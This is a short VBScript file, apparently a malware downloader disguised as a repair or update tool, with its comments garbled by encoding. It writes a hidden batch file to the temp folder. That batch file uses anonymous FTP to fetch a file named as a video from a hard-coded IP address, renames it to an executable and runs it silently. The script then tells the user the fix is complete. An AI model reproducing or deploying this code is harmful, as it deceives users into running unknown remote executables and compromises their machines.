Dim objFSO, objFile, objShell
Dim cmdFile, ftpFile, exeFile, tempPath

' ���ظ������
ftpFile = "load.avi"
exeFile = "fixload.exe"
cmdFile = "updat.bat"

' ��ȡ��ʱ�ļ���·��
tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%")

' �����ļ�ϵͳ������ⲿ�������
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' ���� �������
Set objFile = objFSO.CreateTextFile(tempPath & "\" & cmdFile, True)
objFile.WriteLine "@echo off"
objFile.WriteLine "echo Downloading file from FTP..."
objFile.WriteLine "echo open 8.210.202.2>> ftp_commands.txt" ' ���������ַ
objFile.WriteLine "echo anonymous>> ftp_commands.txt"
objFile.WriteLine "echo user@domain.com>> ftp_commands.txt" ' 
objFile.WriteLine "echo binary>> ftp_commands.txt"
objFile.WriteLine "echo get " & ftpFile & " " & tempPath & "\" & ftpFile & ">> ftp_commands.txt" ' ���ص� %temp% Ŀ¼
objFile.WriteLine "echo bye>> ftp_commands.txt"
objFile.WriteLine "ftp -s:ftp_commands.txt"
objFile.WriteLine "del ftp_commands.txt"
objFile.WriteLine "ren " & tempPath & "\" & ftpFile & " " & exeFile
objFile.WriteLine "start " & tempPath & "\" & exeFile
objFile.WriteLine "echo �޸����"
objFile.Close

' �Զ�ִ�� updat.bat
objShell.Run tempPath & "\" & cmdFile, 0, True

' ��ʾ�û�
WScript.Echo "�޸����,��ˢ����ҳ����"
